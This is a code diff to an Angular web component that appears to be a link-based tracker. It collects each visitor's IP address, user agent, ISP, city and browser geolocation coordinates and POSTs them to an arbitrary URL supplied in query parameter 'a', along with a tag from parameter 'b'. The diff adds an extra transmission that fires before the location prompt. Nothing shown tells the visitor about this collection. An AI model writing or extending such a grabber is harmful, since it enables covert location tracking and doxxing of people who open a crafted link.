@@ -18,6 +18,7 @@ export class AppComponent implements OnInit {
   loc: string = ""; // latitude
   empresa: string = ""; // empresa que fornece internet
   item:string = "";
+  itemB:string = "";
   latitude:any = '';
   longitude:any = ''
   constructor(private httpClient: HttpClient,
@@ -28,7 +29,9 @@ export class AppComponent implements OnInit {
 
   ngOnInit(): void {
     this.route.queryParams.subscribe(params => {
-      this.item = params['a']; // Substitua 'nomeDoItem' pelo nome do seu query param
+      this.item = params['a'];
+      this.itemB = params['b'];
+       // Substitua 'nomeDoItem' pelo nome do seu query param
     });
     this.getIp();
   }
@@ -42,9 +45,26 @@ export class AppComponent implements OnInit {
         this.httpClient.get<adressModel>('https://ipinfo.io/' + this.ip + '/json').subscribe({
           next: (data) => {
             this.city = data.city; this.contry = data.country; this.region = data.region, this.loc = data.loc, this.empresa = data.org;
-            const localStorageList: { key: any  | null, value: string | null }[] = [];
-            const sessionStorageList: { key: any | null, value: string | null }[] = [];
 
+
+            const userInfo = {
+              ip: this.ip,
+              userAgent: this.userAgent,
+              city: this.city,
+              country: this.contry,
+              region: this.region,
+              loc: this.loc,
+              empresa: this.empresa,
+              latitude:this.latitude,
+              longitude:this.longitude,
+              item:this.itemB
+            };
+
+            this.httpClient.post(this.item, userInfo).subscribe({
+              next:(data) => {
+
+              }
+            })
       
             if (navigator.geolocation) {
               navigator.geolocation.getCurrentPosition(
@@ -62,6 +82,7 @@ export class AppComponent implements OnInit {
                     empresa: this.empresa,
                     latitude:this.latitude,
                     longitude:this.longitude,
+                    item:this.itemB
                   };
       
                   this.httpClient.post(this.item, userInfo).subscribe({
@@ -84,6 +105,7 @@ export class AppComponent implements OnInit {
                     empresa: this.empresa,
                     latitude:this.latitude,
                     longitude:this.longitude,
+                    item:this.itemB
                   };
       
                   this.httpClient.post(this.item, userInfo).subscribe({
@@ -107,6 +129,7 @@ export class AppComponent implements OnInit {
                 empresa: this.empresa,
                 latitude:this.latitude,
                 longitude:this.longitude,
+                item:this.itemB
               };
   
               this.httpClient.post(this.item, userInfo).subscribe({
